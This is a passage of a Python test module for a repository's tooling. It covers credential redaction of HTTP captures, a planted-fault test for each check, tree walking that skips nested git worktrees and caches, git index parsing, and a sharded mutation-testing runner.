        self.assertIn("the header Authorization", ran.stderr)
        # A head with CR LF, as gh writes it, is read as a head: its headers and the body's fields are redacted.
        crlf = 'HTTP/2.0 200 OK\r\nX-Foo: bar\r\nContent-Type: application/json\r\n\r\n{"password": "hunter2", "ok": 1}'
        out, said = self.redact(crlf)
        self.assertNotIn("X-Foo", out)
        self.assertNotIn("hunter2", out)
        self.assertIn('"ok": 1', out)
        # Bytes that are not UTF-8 stop it, with nothing written; and what it writes is UTF-8 whatever the locale.
        bad = subprocess.run([sys.executable, "-m", "tools.redact_trial"], cwd=ROOT, capture_output=True,
                             input=b"\xff\xfe", timeout=60)
        self.assertNotEqual(bad.returncode, 0)
        self.assertEqual(bad.stdout, b"")
        wide = subprocess.run([sys.executable, "-m", "tools.redact_trial"], cwd=ROOT, capture_output=True,
                              input="HTTP/2.0 200 OK\n\nfine \u2713\n".encode(), timeout=60,
                              env=dict(os.environ, LC_ALL="C", LANG="C", PYTHONIOENCODING="ascii"))
        self.assertEqual((wide.returncode, wide.stdout), (0, "HTTP/2.0 200 OK\n\nfine \u2713\n".encode()))
        # The App's script sends the report to its pipe and the clean text to its file: in that order, or the report
        # would go to the file.
        script = (ROOT / "tools" / "trial_as_app.sh").read_text()
        self.assertIn('python3 -m tools.redact_trial < "$1" 2>&1 > "${1%.raw}.clean") | sed', script)
        # Its redact(), run alone: a capture that redacts is deleted beside its clean file; one that fails is deleted
        # unread with its partial clean file, since both lie in OUT, which a session reads, and the failure is returned.
        function = re.search(r"^redact\(\) \{.*?^\}$", script, re.M | re.S).group(0)
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (folder / "good.raw").write_text("HTTP/2.0 200 OK\nAuthorization: x\n\nfine\n")
        (folder / "bad.raw").write_bytes(b"\xff\xfe")
        ran = subprocess.run(["bash", "-c", 'set -uo pipefail\nroot="$1"\n%s\nredact "$2/good.raw"; echo "good=$?"\n'
                              'redact "$2/bad.raw"; echo "bad=$?"' % function, "-", str(ROOT), str(folder)],
                             capture_output=True, text=True, timeout=60)
        self.assertIn("good=0", ran.stdout)
        self.assertIn("bad=1", ran.stdout)
        self.assertIn("failed; its capture is deleted unread", ran.stderr)
        self.assertEqual(sorted(p.name for p in folder.iterdir()), ["good.clean"])
        self.assertEqual((folder / "good.clean").read_text(), "HTTP/2.0 200 OK\n\nfine\n")

    def test_a_drafted_fixture_comes_out_with_no_credential(self):
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "tok" + "en " + SHAPED["ghs"]
        data["exchanges"][0]["request"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][0]["response"]["body"]["token"] = SHAPED["runner registration"]
        data["exchanges"][0]["response"]["body"]["expires_at"] = "2026-10-15T15:02:11Z"
        data["exchanges"][0]["response"]["body"]["clone"] = SHAPED["token in a url"]
        data["exchanges"][0]["response"]["body"]["blob"] = SHAPED["base64 of a runner's credentials"]
        data["exchanges"][0]["response"]["body"]["notes"] = [SHAPED[name] for name in sorted(SHAPED)]
        data["exchanges"][0]["response"]["body"]["by_key"] = {SHAPED["ghs"]: 1, "Bearer\x00Zx9Qw8Er7Ty6Ui5Op4As3Df5": 2}
        out, said = self.redact(json.dumps(data))
        kept = json.loads(out)
        self.assertEqual(check_trials._credentials(kept, ""), [])
        self.assertEqual(check_trials._headers(kept), [])
        self.assertEqual(validate(kept, json.loads((ROOT / "schemas" / "trial.schema.json").read_text())), [])
        body = kept["exchanges"][0]["response"]["body"]
        self.assertEqual((body["expires_at"], body["external_id"]), ("2026-10-15T15:02:11Z", "factory-run-r1"))
        self.assertNotIn("token", body)
        self.assertNotIn("clone", body)
        self.assertEqual((body["notes"], body["by_key"]), ([], {}))
        self.assertIn("exchanges[0].request.headers.Authorization", kept["removed"])
        self.assertIn("exchanges[0].response.body.token", kept["removed"])
        self.assertIn("exchanges[0].response.body.clone", kept["removed"])
        self.assertIn("exchanges[0].response.body.by_key." + check_trials.KEY_SHAPED, kept["removed"])
        self.assertNotIn("Zx9Qw8", out + said)
        for value in SHAPED.values():
            self.assertNotIn(value, out + said)

    def test_a_header_named_by_a_credential_is_reported_without_it(self):
        raw = "HTTP/2.0 200 OK\n" + SHAPED["ghs"] + ": 1\nContent-Type: text/plain\n\nfine\n"
        out, said = self.redact(raw)
        self.assertEqual(out, "HTTP/2.0 200 OK\nContent-Type: text/plain\n\nfine\n")
        self.assertIn("the header " + check_trials.KEY_SHAPED, said)
        self.assertNotIn(SHAPED["ghs"], said)

    def test_a_raw_capture_comes_out_with_no_credential(self):
        raw = ("HTTP/2.0 201 Created\nAuthorization: tok" + "en " + SHAPED["ghp"] + "\nX-Ratelimit-Remaining: 4999\nX-GitHub-SSO: required\n"
               "Set-" + "Cookie: user_session=abcdef\nLocation: " + SHAPED["signed url"] + "\n\n"
               + json.dumps({"tok" + "en": SHAPED["runner registration"], "expires_at": "2026-10-15T15:02:11Z"}) + "\n")
        out, said = self.redact(raw)
        self.assertIn("X-Ratelimit-Remaining: 4999", out)
        self.assertIn("expires_at", out)
        self.assertNotIn("Cookie", out)
        self.assertNotIn("X-GitHub-SSO", out)
        for value in (SHAPED["ghp"], SHAPED["runner registration"], "user_session", "sig=AbCdEf"):
            self.assertNotIn(value, out + said)
        self.assertIn("Authorization", said)

    def test_text_that_is_not_a_capture_is_still_redacted(self):
        out, said = self.redact("kept line\none line, " + SHAPED["jwt"] + " and done\n")
        self.assertEqual((out, said.splitlines()[0]), ("kept line\n", "removed: line 2"))


# One planted fault for each check, run from its front door. A check gutted to return nothing fails here.
FAILS = {
    "check_examples": lambda: check_examples.run(clone({"examples/decision.json": "{}"})),
    "check_lifecycle": lambda: check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(
        dict(check_lifecycle.load("issue"), terminal=[]))})),
    "check_apps": lambda: check_apps.run(clone({"config/apps.json": (ROOT / "config" / "apps.json").read_text()
                                                .replace('"level": "read"', '"level": "write"')})),
    "check_rulesets": lambda: check_rulesets.run(clone({"config/rulesets.json": (ROOT / "config" / "rulesets.json")
                                                        .read_text().replace("15368", "15369")})),
    "check_authority": lambda: check_authority.run(dict(json.loads((ROOT / "config" / "authority.json").read_text()),
                                                         author_role="pr-review")),
    "check_purity": lambda: check_purity.run(clone({"kernel/clock.py": "import time\n"})),
    "check_repo": lambda: check_repo.run(clone({"requirements.txt": "requests\n"})),
    "check_workflows": lambda: check_workflows.run(clone({".github/workflows/verify.yml": GOOD.replace("minutes: 25", "minutes: 45")})),
    "check_context": lambda: check_context.run(clone({"docs/lessons.md": "# Lessons\n"})),
    "check_trials": lambda: check_trials.run(clone({"trials/notes.txt": "x\n"})),
    "check_release": lambda: check_release.run(clone({"release/current.py": "import os\n"})),
    "check_decisions": lambda: check_decisions.run(edited(history(), {FIRST: RECORD.replace("one thing.", "x.")})),
}


class Verify(unittest.TestCase):
    def test_every_check_is_run_by_verify(self):
        on_disk = {p.stem for p in (ROOT / "tools").glob("check_*.py")}
        run = {check.__module__.split(".")[-1] for _, check in verify.CHECKS}
        self.assertEqual(on_disk, run)

    def test_every_check_has_a_test_in_which_it_fails(self):
        self.assertEqual(set(FAILS), {p.stem for p in (ROOT / "tools").glob("check_*.py")})
        for name, planted in sorted(FAILS.items()):
            self.assertTrue(planted(), "%s finds nothing wrong with a planted fault" % name)
        # In CI this repo is a checkout, and compared with main; the copy `mutants.py` runs this in is an export.
        with outside_actions():
            for name, check in verify.CHECKS:
                self.assertEqual(check(), [], "%s finds fault with this repo" % name)

    def test_another_working_tree_inside_this_one_is_not_read(self):
        # A session's git worktree sits in the main checkout, a whole copy of the repo with a .git
        # file. A full clone has a .git directory. Neither is this repo, and nothing in it is checked.
        stray = {"AGENTS.md": "# other\n\n| Rule | Held by |\n|---|---|\n| x | `tools/gone.py` |\n",
                 "CLAUDE.md": "Be careful.\n", "requirements.txt": "requests\n",
                 "tests/test_x.py": "def test_x():\n    pass\n", "tests/deep/test_y.py": "",
                 "kernel/clock.py": "import time\n", "notes.txt": "github_pat_" + "x" * 40 + "\n"}
        planted = {"wt/.git": "gitdir: /elsewhere\n", "wt/notes.txt": "A folder with no AGENTS.md.\n"}
        for where, git in ((".claude/worktrees/other", ".git"), (".claude/worktrees/clone", ".git/HEAD"),
                           ("kernel/wt", ".git"), ("docs/wt", ".git")):
            planted["%s/%s" % (where, git)] = "gitdir: /elsewhere\n"
            planted.update({"%s/%s" % (where, rel): text for rel, text in stray.items()})
        root = clone(planted)
        walking = [(name, check) for name, check in verify.CHECKS
                   if "root" in check.__code__.co_varnames[:check.__code__.co_argcount]]
        self.assertGreaterEqual(len(walking), 5)
        for name, check in walking:
            with self.subTest(check=name), outside_actions():      # the copy is an export, with no .git
                self.assertEqual(check(root), [], "%s reads another working tree as this one" % name)

    def test_a_copy_of_the_repo_leaves_out_another_working_tree(self):
        root = tree({"a/x.py": "", "a/__pycache__/x.pyc": "", "corpus/d.jsonl": "", ".git/HEAD": "",
                     "wt/.git": "gitdir: /elsewhere\n", "wt/y.py": "", "a/clone/.git/HEAD": "", "a/clone/z.py": "",
                     "a/corpus/y.py": ""})
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/corpus/y.py", "a/x.py"])
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertEqual([p.name for p in to.iterdir()], ["a"])
        self.assertEqual(sorted(p.name for p in (to / "a").iterdir()), ["corpus", "x.py"])

    def test_only_the_corpus_at_the_root_is_skipped_and_only_a_directory(self):
        # make_corpus.py writes corpus/ at the root, and nowhere else. A folder of that name below
        # the root is code like any other, and a file named for a skipped folder is a file.
        token = "github_pat_" + "x" * 40 + "\n"
        root = clone({"kernel/corpus/x.py": "import time\n", "sim/corpus/test_hidden.py": "",
                      "sim/corpus/notes.txt": token, "corpus": token, "sim/__pycache__": token})
        self.assertTrue(caught(check_purity.run(root), "corpus/x.py:1 imports time"))
        problems = check_repo.run(root)
        for words in ("sim/corpus/test_hidden.py: a test outside tests/", "sim/corpus/notes.txt: holds something",
                      "corpus: holds something", "sim/__pycache__: holds something"):
            self.assertTrue(caught(problems, words), words)


    def test_local_output_is_skipped_only_while_git_does_not_hold_it(self):
        # CI checks out the commit afresh, with git's index beside it. Whatever is under __pycache__/
        # or the root's corpus/ there is either in the index, and committed, or written by this run.
        files = {"kernel/x.py": "", "kernel/__pycache__/x.cpython-39.pyc": "", "corpus/d.jsonl": "",
                 "sim/__pycache__/y.cpython-39.pyc": "", "corpus/local.jsonl": "", "a/corpus/z.py": ""}
        held = {"kernel/x.py": FILE, "kernel/__pycache__/x.cpython-39.pyc": FILE, "corpus/d.jsonl": FILE,
                "a/corpus/z.py": FILE}
        listed = ["a/corpus/z.py", "corpus/d.jsonl", "kernel/__pycache__/x.cpython-39.pyc", "kernel/x.py"]
        for version in (2, 3, 4):
            with self.subTest(version=version):
                root = commit(tree(files), held, version)
                self.assertEqual(walk.index(root), held)
                self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], listed)
                to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
                walk.copy(root, to)
                self.assertEqual([(to / rel).exists() for rel in files], [True, True, True, False, False, True])
        # A worktree's .git is a file that names its index's directory, which may be anywhere.
        gitdir = commit(pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)), held) / ".git"
        root = tree(dict(files, **{".git": "gitdir: %s\n" % gitdir}))
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], listed)
        # With nothing committed yet, or no .git at all, nothing can be committed; all of it is local.
        for root in (commit(tree(files), {}), tree(files)):
            self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/corpus/z.py", "kernel/x.py"])
        # Local output in any case is local output: a file system may fold case, and Python's caches with it.
        local = {"kernel/x.py": "", "sim/__PYCACHE__/y.pyc": "", "Corpus/local.jsonl": ""}
        for root in (commit(tree(local), {"kernel/x.py": FILE}), tree(local)):
            self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["kernel/x.py"])

    def test_an_index_git_writes_is_read_as_git_reads_it(self):
        # Each way git may write it: SHA-1 or SHA-256 object ids; version 3, which an entry only added
        # with -N needs, or 4; and the checksum at its end, or zeros there under index.skipHash.
        files = {"a.py": "", "kernel/x.py": "", "kernel/__pycache__/x.cpython-39.pyc": "", "é.md": "",
                 "z/" + "deep/" * 30 + "f.py": "", "later.py": ""}
        for objects, size in (("sha1", 20), ("sha256", 32)):
            for config in ((), ("index.version=4",), ("index.skipHash=true",), ("index.skipHash=true", "index.version=4")):
                with self.subTest(objects=objects, config=config):
                    root = tree(files)
                    git(root, "init", "-q", "--object-format=" + objects)
                    for setting in config:
                        git(root, "config", *setting.split("=", 1))
                    git(root, "add", "-f", "--", *sorted(set(files) - {"later.py"}))
                    git(root, "add", "-N", "later.py")
                    git(root, "update-index", "--add", "--cacheinfo", "160000,%s,kernel/lib" % ("1" * size * 2))
                    data = (root / ".git" / "index").read_bytes()
                    self.assertEqual(not any(data[-size:]), "index.skipHash=true" in config)
                    self.assertEqual(walk.index(root), held_by_git(root))
                    self.assertEqual(walk.index(root)["kernel/lib"], GITLINK)
        # A worktree's gitdir keeps no config; the repo's, with its object format, is in its common dir.
        main = staged({"a.py": ""}, "index.skipHash=true", objects="sha256")
        gitdir = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (gitdir / "index").write_bytes((main / ".git" / "index").read_bytes())
        (gitdir / "commondir").write_text(str(main / ".git") + "\n")
        root = tree({"a.py": "", ".git": "gitdir: %s\n" % gitdir})
        self.assertEqual(walk.index(root), {"a.py": FILE})

    def test_the_index_is_read_as_git_wrote_it(self):
        held = walk.index(ROOT)
        if held is None:        # an export, with no .git to read
            self.assertFalse(os.path.lexists(str(ROOT / ".git")))
            return
        self.assertEqual((held["AGENTS.md"], held["tools/walk.py"]), (FILE, FILE))
        self.assertFalse([p for p in held if "__pycache__" in p or p.startswith("corpus/")])

    def test_a_link_is_not_followed_and_a_link_to_nothing_is_reported(self):
        root = tree({"a/x.py": ""})
        (root / "l").symlink_to("a", target_is_directory=True)
        (root / "gone.py").symlink_to("nowhere.py")
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/x.py"])
        self.assertTrue(caught(check_repo.run(root), "gone.py: a link to nothing"))
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertTrue((to / "l").is_symlink() and (to / "gone.py").is_symlink())

    def test_only_the_walk_walks_the_tree(self):
        # One walk, so that every check and every copy skips the same things.
        found = sorted(p.relative_to(ROOT).as_posix() for p in walk.files(ROOT)
                       if p.suffix == ".py" and p.relative_to(ROOT).parts[0] in ("tools", "tests", "sim")
                       and walkers(p.read_text()))
        self.assertEqual(found, ["tools/walk.py"])

    def test_a_walk_written_another_way_is_still_a_walk(self):
        for source in ("os.walk(root)\n", "os.walk (root)\n", "os.fwalk(root)\n", "root.walk()\n",
                       "root.rglob('*.py')\n", "os.scandir(root)\n", "shutil.copytree(a, b)\n",
                       "from os import walk\n", "from shutil import copytree as ct\nct(a, b)\n",
                       "ct = shutil.copytree\n", "glob.glob('x', recursive=True)\n", "glob.iglob('**/*.py')\n",
                       "root.glob('x/**/*.py')\n"):
            self.assertTrue(walkers(source), source)
        self.assertEqual(walkers("from tools import walk\nwalk.files(root)\nroot.glob('*.py')\n"
                                 "glob.glob('x', recursive=False)\nast.walk(tree)\n"), [])

    def test_a_check_that_finds_a_problem_fails_verify(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertTrue(verify.failed([("always", lambda: ["a problem"])]))
            self.assertFalse(verify.failed([("never", lambda: [])]))
        self.assertIn("a problem", said.getvalue())

    def test_make_fast_is_verify_without_the_seeded_simulation(self):
        """The required check runs every test file at any depth; only `make fast` leaves the slow ones out."""
        everything = {".".join(p.relative_to(ROOT).with_suffix("").parts) for p in walk.files(ROOT, "tests")
                      if p.name.startswith("test_") and p.suffix == ".py"}
        slow = {"tests." + name for name in verify.SLOW}
        self.assertTrue(slow <= everything, "a slow test named in verify.SLOW does not exist")
        ran = {}

        class Runner:
            def __init__(self, **_):
                pass

            def run(self, suite):
                ran["modules"] = modules_in(suite)
                return unittest.TestResult()

        real = (verify.failed, verify.unittest.TextTestRunner)
        verify.failed, verify.unittest.TextTestRunner = (lambda checks: False), Runner
        try:
            with contextlib.redirect_stdout(io.StringIO()):     # main prints the unverified rules
                self.assertEqual(verify.main([]), 0)
                self.assertEqual(ran["modules"], everything)
                verify.main(["--fast"])
                self.assertEqual(ran["modules"], everything - slow)
        finally:
            verify.failed, verify.unittest.TextTestRunner = real
        makefile = (ROOT / "Makefile").read_text()
        self.assertIn("\nverify:\n\t$(PY) -m tools.verify\n", makefile)
        self.assertIn("\nfast:\n\t$(PY) -m tools.verify --fast\n", makefile)

    def test_every_test_file_is_discovered(self):
        found = set()

        def names(suite):
            for item in suite:
                if isinstance(item, unittest.TestSuite):
                    names(item)
                else:
                    found.add(type(item).__module__.split(".")[-1])

        names(unittest.defaultTestLoader.discover(str(ROOT / "tests"), top_level_dir=str(ROOT)))
        self.assertEqual(found, {p.stem for p in (ROOT / "tests").glob("test_*.py")})

    def test_every_link_is_listed_and_none_is_followed(self):
        # A link is never another working tree to skip, even when what it points at holds a .git.
        root = tree({"a/x.py": "", "other/.git": "gitdir: /elsewhere\n", "other/y.py": ""})
        (root / "a" / "l").symlink_to("..", target_is_directory=True)
        (root / "a" / "wt").symlink_to("../other", target_is_directory=True)
        (root / "a" / "f.py").symlink_to("x.py")
        (root / "a" / "gone.py").symlink_to("nowhere.py")
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.links(root)],
                         ["a/f.py", "a/gone.py", "a/l", "a/wt"])
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/f.py", "a/x.py"])


AGAIN = "; fix the copy or run named here, then run python3 -m tools.mutants again"
FAILS_A_TEST = ("F\n%s\nFAIL: test_x (tests.test_x.T)\n%s\nAssertionError\n\nRan 1 test\n\nFAILED (failures=1)\n"
                % ("=" * 70, "-" * 70))


MEND = "; mark or mend that test, then run python3 -m tools.mutants again"
PASSES = (0, 0, "OK\n")


def told(behaviour: dict, calls: list):
    """A stand-in for `mutants.suite`, which answers by the word the mutant wrote into k.py.

    A test run alone is answered by the word with " alone" after it, if `behaviour` has it, and by the word if not. A
    list of answers gives one to each run in turn, the last given again to the runs after it.
    """
    def run(work, first=(), only=None):
        said = (work / "k.py").read_text().strip() + (" alone" if only else "")
        calls.append(said)
        answers = behaviour.get(said, behaviour.get(said.replace(" alone", "")))
        if isinstance(answers, list):
            wait, status, output = answers[min(calls.count(said), len(answers)) - 1]
        else:
            wait, status, output = answers
        time.sleep(wait)
        if isinstance(output, Exception):
            raise output
        calls.append("done " + said)
        return status, output
    return run


def mutate(*names) -> list:
    return [(name, "k.py", "rule\n", name + "\n") for name in names]


def suite_of(test: str, files: dict = None) -> pathlib.Path:
    """A throwaway repo whose tests are one module holding `test`, a method of a TestCase, beside any other `files`."""
    return tree(dict(files or {}, **{"tests/__init__.py": "", "tests/test_x.py": "import os\nimport time\nimport "
                                     "unittest\n\n\nclass T(unittest.TestCase):\n" + test}))


class Mutants(unittest.TestCase):
    """The mutation check runs its mutants side by side, and only a failing test kills one."""

    def check(self, behaviour: dict, names: list, extra: list = ()):
        calls = []
        behaviour = dict(behaviour, rule=(0, 0, "OK\n"))
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate(*names) + list(extra), tree({"k.py": "rule\n"}), told(behaviour, calls), 3)
        return code, said.getvalue().splitlines(), calls

    @support.wall_clock
    def test_mutants_are_reported_in_their_order_however_their_runs_finish(self):
        code, lines, calls = self.check({"slow": (0.5, 1, FAILS_A_TEST), "quick": (0, 1, FAILS_A_TEST),
                                         "quicker": (0, 1, FAILS_A_TEST)}, ["slow", "quick", "quicker"])
        self.assertEqual(calls[:2], ["rule", "done rule"], "the run of the unbroken tests is first, and alone")
        self.assertLess(calls.index("done quicker"), calls.index("done slow"), "the runs did not overlap")
        self.assertEqual(lines, ["killed    slow", "killed    quick", "killed    quicker", "3 of 3 mutants killed"])
        self.assertEqual(code, 0)

    @support.wall_clock
    def test_a_run_that_hangs_is_ended_reported_and_fails_the_check(self):
        began = time.monotonic()
        self.assertIsNone(mutants.suite(suite_of("    def test_x(self):\n        time.sleep(60)\n"), 1)[0])
        self.assertLess(time.monotonic() - began, 30)
        code, lines, _ = self.check({"hangs": (0, None, "")}, ["hangs"])
        self.assertEqual(lines, ["ERROR     hangs (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN),
                                 "0 of 1 mutants killed"])
        self.assertEqual(code, 1)

    def test_only_a_failing_test_kills_a_mutant(self):
        cases = {
            "a test fails": ("    def test_x(self):\n        self.assertEqual(1, 2)\n", "killed"),
            "a test raises": ("    def test_x(self):\n        {}['gone']\n", "killed"),
            "every test passes": ("    def test_x(self):\n        pass\n", "SURVIVED"),
            "the runner dies": ("    def test_x(self):\n        os._exit(1)\n", "ERROR"),
            "a module will not import": ("    pass\n\n\nimport a_module_the_copy_left_out\n", "ERROR"),
        }
        for name, (test, outcome) in cases.items():
            said, why = mutants.verdict(*mutants.suite(suite_of(test)))
            self.assertEqual(said, outcome, name)
            self.assertTrue(said != "ERROR" or why.endswith(AGAIN), name)
        crash = "Traceback (most recent call last):\nMemoryError\n"
        self.assertEqual(mutants.verdict(1, crash), ("ERROR", "exit status 1 and no test failed, ending 'MemoryError'" + AGAIN))
        self.assertEqual(mutants.verdict(2, FAILS_A_TEST)[0], "ERROR")
        code, lines, _ = self.check({"crashes": (0, 1, crash)}, ["crashes"])
        self.assertEqual(lines[0], "ERROR     crashes (exit status 1 and no test failed, ending 'MemoryError'%s)" % AGAIN)
        self.assertEqual(code, 1)

    def test_each_run_stops_at_its_first_failure(self):
        status, output = mutants.suite(suite_of("    def test_a(self):\n        self.fail()\n\n"
                                                "    def test_b(self):\n        self.fail()\n"))
        self.assertEqual((status, output.count("FAIL: ")), (1, 1))

    def test_the_tests_a_mutant_names_run_first_and_the_whole_suite_after_them(self):
        where = suite_of("    def test_a(self):\n        pass\n\n    def test_b(self):\n        self.fail()\n")
        status, output = mutants.suite(where, first=("tests.test_x.T.test_b",))
        self.assertEqual((status, output.count("FAIL: ")), (1, 1))
        self.assertIn("Ran 1 test", output, "only the test named ran")
        status, output = mutants.suite(where, first=("tests.test_x.T.test_a",))
        self.assertEqual((status, output.count("FAIL: test_b")), (1, 1), "the whole suite ran after the named test passed")
        said = mutants.verdict(*mutants.suite(where, first=("tests.test_x.T.test_gone",)))
        self.assertEqual(said[0], "ERROR", "a test named that is not there kills nothing")
        status, output = mutants.suite(where, only="tests.test_x.T.test_a")
        self.assertEqual((status, output.count("Ran 1 test")), (0, 1), "the test named alone ran alone, and passed")
        calls = []

        def run(work, **given):
            calls.append(given)
            return (0, "OK\n") if (work / "k.py").read_text() == "rule\n" else (1, FAILS_A_TEST)
        for mutant in (("named", "k.py", "rule\n", "x\n", ("tests.test_x.T.test_b",)), ("plain", "k.py", "rule\n", "x\n")):
            self.assertEqual(mutants.attempt(mutant, tree({"k.py": "rule\n"}), run)[0], "killed")
        alone = {"only": "tests.test_x.T.test_x"}
        self.assertEqual(calls, [{"first": ("tests.test_x.T.test_b",)}, alone, alone, {}, alone, alone],
                         "the test that failed ran alone on the mutant and on the unbroken code")

    def test_the_summary_counts_only_the_mutants_killed(self):
        stale = [("gone", "k.py", "not there\n", "x\n")]
        code, lines, _ = self.check({"fails": (0, 1, FAILS_A_TEST), "passes": (0, 0, "OK\n")},
                                    ["fails", "passes"], stale)
        self.assertEqual(lines, ["killed    fails", "SURVIVED  passes", "STALE     gone (the code it mutates has changed)",
                                 "1 of 3 mutants killed"])
        self.assertEqual(code, 1)

    def test_a_run_that_raises_is_an_error_and_the_rest_still_report(self):
        code, lines, _ = self.check({"before": (0, 1, FAILS_A_TEST), "raises": (0, 1, OSError("disk full")),
                                     "after": (0.2, 1, FAILS_A_TEST)}, ["before", "raises", "after"])
        self.assertEqual(lines, ["killed    before", "ERROR     raises (the run failed with OSError: disk full%s)" % AGAIN,
                                 "killed    after", "2 of 3 mutants killed"])
        self.assertEqual(code, 1)

    def test_every_mutant_is_in_exactly_one_shard(self):
        # CI runs the mutants in shards, one job each. A mutant in no shard is a rule nobody checks; one in two is run
        # twice. Each is told apart by its name, so no name is used twice.
        names = [mutant[0] for mutant in mutants.MUTANTS]
        self.assertEqual(len(names), len(set(names)))
        for count in range(1, 13):
            placed = [mutant[0] for index in range(count) for mutant in mutants.shard(mutants.MUTANTS, index, count)]
            self.assertEqual(sorted(placed), sorted(names), count)

    def test_a_shard_is_read_from_the_matrix_or_the_run_stops(self):
        every = len(mutants.MUTANTS)
        self.assertEqual(mutants.selected({}), (mutants.MUTANTS, "", None))
        chosen, where, at_once = mutants.selected({"MUTANTS_SHARD": "2", "MUTANTS_SHARDS": "6"})
        self.assertEqual((chosen, where, at_once), (mutants.shard(mutants.MUTANTS, 2, 6), ", in shard 2 of 6 counted "
                                                                                          "from 0", None))
        for shard, count, said in (("1", None, "set both"), (None, "6", "set both"), ("", "6", "set both"),
                                   ("one", "6", "set both"), ("-1", "6", "set both"), ("1.0", "6", "set both"),
                                   ("6", "6", "below the count"), ("0", "0", "below the count"),
                                   (str(every), str(every + 1), "holds no mutant")):
            given = {k: v for k, v in (("MUTANTS_SHARD", shard), ("MUTANTS_SHARDS", count)) if v is not None}
            with self.assertRaises(ValueError, msg=given) as raised:
                mutants.selected(given)
            self.assertIn(said, str(raised.exception), given)
        # From the front door, a shard it cannot read stops the run before any test runs.
        env = dict(os.environ, MUTANTS_SHARD="0", MUTANTS_SHARDS="0")
        done = subprocess.run([sys.executable, "-m", "tools.mutants"], cwd=str(ROOT), env=env, capture_output=True,
                              text=True, timeout=60)
        self.assertEqual((done.returncode, done.stdout.strip()), (1, "MUTANTS_SHARD is 0 and MUTANTS_SHARDS is 0; the "
                                                                     "shard is counted from 0, below the count"))

    def test_every_mutant_names_a_test_that_exists(self):
        # Issue 217: a mutant that names no test ran the whole suite, which was most of a CI leg's time, and a name
        # that does not exist made its mutant an ERROR. Every mutant names the tests that kill it, and each exists.
        self.assertEqual(mutants.unnamed(mutants.MUTANTS), [])
        good = ("tests.test_tools.Mutants.test_every_mutant_names_a_test_that_exists", "tests.test_tools.Mutants",
                "tests.test_tools")
        self.assertEqual(mutants.unnamed([("ok", "k.py", "rule\n", "x\n", good)]), [])
        for bad, why in (("tests.test_tools.NeedsPassed", "does not exist"), ("tests.test_tools.Mutants.test_gone",
                         "does not exist"), ("tests.test_nowhere", "whose module does not exist"),
                         ("tests.test_simulator.Roll", "not a TestCase"), ("tests.test_tools.Mutants.check",
                         "not a test method"), ("tools.mutants", "not a test module"),
                         ("tests.support", "not a test module"), ("unittest.TestCase", "not a test module"),
                         ("tests.test_tools.unittest.TestCase", "not a TestCase"), ("tests.test_tools.suite_of",
                         "not a method of a TestCase"), ("", "not a test module"), (".tests.test_tools",
                         "not a test module"), ("tests..test_tools", "not a test module"),
                         # A module below a package under tests/ is a test module by its own name, as modules() lists it.
                         ("tests.deep.test_nested", "whose module does not exist"), ("tests.deep.nested",
                         "whose module does not exist"), ("tests.support.x", "not a test module")):
            said = mutants.unnamed([("m", "k.py", "rule\n", "x\n", (bad,))])
            self.assertEqual(len(said), 1, bad)
            self.assertIn(why, said[0], bad)
        self.assertEqual(mutants.unnamed([("m", "k.py", "rule\n", "x\n")]), ["'m' names no test; name the tests that "
                                                                            "kill it"])
        self.assertEqual(mutants.unnamed([("m", "k.py", "rule\n", "x\n", ())])[0][:19], "'m' names no test; ")
        # The front door refuses such a list before any test runs.
        with self.assertRaises(ValueError) as raised:
            mutants.selected({}, mutants=[("m", "k.py", "rule\n", "x\n")])
        self.assertIn("1 mutant(s) name no test", str(raised.exception))

    def test_slow_modules_run_last(self):
        # Issue 217: the fallback after the tests a mutant names ran the modules alphabetically, so a mutant in tools/
        # ran test_hooks and test_simulator before test_tools killed it. The slow modules, SLOW's and test_hooks, run
        # last; every module still runs, read from the directory, so a new one is never left out.
        passes, fails = "    def test_a(self):\n        pass\n", "    def test_a(self):\n        self.fail()\n"
        module = "import unittest\n\n\nclass T(unittest.TestCase):\n"
        where = suite_of(passes, {"tests/test_hooks.py": module + fails, "tests/test_simulator.py": module + passes,
                                  "tests/test_new.py": module + passes, "tests/test_aardvark.py": module + passes,
                                  "tests/deep/__init__.py": "", "tests/deep/test_nested.py": module + passes,
                                  "tests/testplain.py": module + passes, "tests/support.py": module + fails})
        self.assertEqual(mutants.modules(where), ["tests.deep.test_nested", "tests.test_aardvark", "tests.test_new",
                                                  "tests.test_x", "tests.testplain", "tests.test_hooks",
                                                  "tests.test_simulator"])
        status, output = mutants.suite(where)
        self.assertEqual((status, output.count("FAIL: test_a (tests.test_hooks.T")), (1, 1), output)
        self.assertIn("Ran 6 tests", output, "every quick module, a nested one too, ran before the slow one that failed")
        where = suite_of(passes, {"tests/test_new.py": module + fails})
        self.assertEqual(mutants.verdict(*mutants.suite(where))[0], "killed", "a module not named anywhere is run")

    def test_a_filtered_run_is_capped(self):
        # Issue 217: `python3 -m tools.mutants PATH...` is the one local run allowed: the mutants whose target is one
        # of the paths, at most FILTER_MOST of them, FILTER_WORKERS at a time, never a shard. With no path, as before.
        few = [("m%d" % n, "kernel/gate.py" if n % 2 else "kernel/brakes.py", "rule\n", "x\n",
                ("tests.test_tools.Mutants",)) for n in range(50)]
        chosen, where, at_once = mutants.selected({}, ["kernel/gate.py"], few)
